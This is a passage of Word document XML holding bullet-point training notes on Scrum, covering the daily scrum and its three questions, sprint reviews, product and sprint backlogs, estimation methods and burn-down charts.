      <w:r w:rsidRPr="00651C7F">
        <w:t>Is a short (15 minutes long) meeting, which is held every day before the Team starts working</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="144"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Participants: Scrum Master (which is the chairman), Scrum Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="144"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>“Chickens” and “Pigs”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="144"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Every Team member should answer on 3 questions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="004638D0" w:rsidRDefault="004638D0" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="006967CC" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Questions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="006967CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006967CC">
        <w:t xml:space="preserve">What did you do since the last Scrum? </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="006967CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006967CC">
        <w:t>What are you doing until the next Scrum?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="006967CC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="145"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006967CC">
        <w:t>What is stopping you getting on with the work?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Daily Scrum</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="146"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Is NOT a problem solving session</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="146"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Is NOT a way to collect information about WHO is behind the schedule</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="146"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Is a meeting in which team members make commitments to each other and to the Scrum Master</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00651C7F" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="146"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00651C7F">
        <w:t>Is a good way for a Scrum Master to track the progress of the Team</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sprint Review Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B32256" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="147"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B32256">
        <w:t>Is held at the end of each Sprint</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B32256" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="147"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B32256">
        <w:t>Business functionality which was created during the Sprint is demonstrated to the Product Owner</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B32256" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="147"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B32256">
        <w:t>Informal, should not distract Team members of doing their work</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Scrum Artifacts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="000E24F5" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="148"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="000E24F5">
        <w:t>Product Backlog</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="000E24F5" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="148"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="000E24F5">
        <w:t>Sprint Backlog</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="000E24F5" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="148"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="000E24F5">
        <w:t>Burn down Charts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Product Backlog</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00047B85" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="149"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00047B85">
        <w:t>Requirements for a system, expressed as a prioritized list of Backlog Items</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00047B85" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="149"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00047B85">
        <w:t>Is managed and owned by a Product Owner</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00047B85" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="149"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00047B85">
        <w:lastRenderedPageBreak/>
        <w:t>Spreadsheet (typically)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00A9011A" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="149"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A9011A">
        <w:t>Usually is created during the Sprint Planning Meeting</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00A9011A" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="149"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00A9011A">
        <w:t>Can be changed and re-prioritized before each PM</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Estimation of Product Backlog Items</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Establishes team’s velocity (how much Effort a Team can handle in one Sprint)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t xml:space="preserve">Determining units of complexity. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Size-category (“T-Shirt size”)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Story points</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Work days/work hours</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Methods of estimation:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Expert Review</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00664859" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="150"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00664859">
        <w:t>Creating a Work Breakdown Structure (WBS)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Product Backlog</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="151"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t>Is only a FORECAST!-&gt; is not exact</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sprint Backlog</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="152"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t>A subset of Product Backlog Items, which define the work for a Sprint</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="152"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t>Is created ONLY by Team members</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="152"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t xml:space="preserve">Each Item has </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C555A3">
        <w:t>it’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C555A3">
        <w:t xml:space="preserve"> own status</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="152"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t>Should be updated every day</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="153"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t xml:space="preserve">No more </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C555A3">
        <w:t>then</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C555A3">
        <w:t xml:space="preserve"> 300 tasks in the list</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="153"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t>If a task requires more than 16 hours, it should be broken down</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00C555A3" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="153"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C555A3">
        <w:t>Team can add or subtract items from the list. Product Owner is not allowed to do it</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="154"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:lastRenderedPageBreak/>
        <w:t>Is a FORECAST!</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="154"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Is a good warning monitor</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004638D0" w:rsidRDefault="004638D0" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Burn down Charts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="155"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Are used to represent “work done”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="155"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>3 Types:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="155"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Sprint Burn down Chart (progress of the Sprint)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="155"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Release Burn down Chart (progress of release)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="155"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Product Burn down chart (progress of the Product)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Burn down Charts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="156"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>X-Axis: time (usually in days)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="156"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86B5D">
        <w:t>Y-Axis: remaining effort</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E86B5D" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E"/>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sprint Burn down Chart</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="157"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Depicts the total Sprint Backlog hours remaining per day</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="157"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Shows the estimated amount of time to release</w:t>
      </w:r>
      <w:r w:rsidRPr="001B44B8">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="157"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Ideally should burn down to zero to the end of the Sprint</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="157"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Actually is not a straight line</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="157"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Can bump UP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>&gt;&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00651C7F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Release Burn down Chart</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="158"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Will the release be done on right time?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="158"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>X-axis: sprints</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="158"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>Y-axis: amount of hours remaining</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="001B44B8" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="158"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001B44B8">
        <w:t>The estimated work remaining can also burn up</w:t>
      </w:r>
    </w:p>
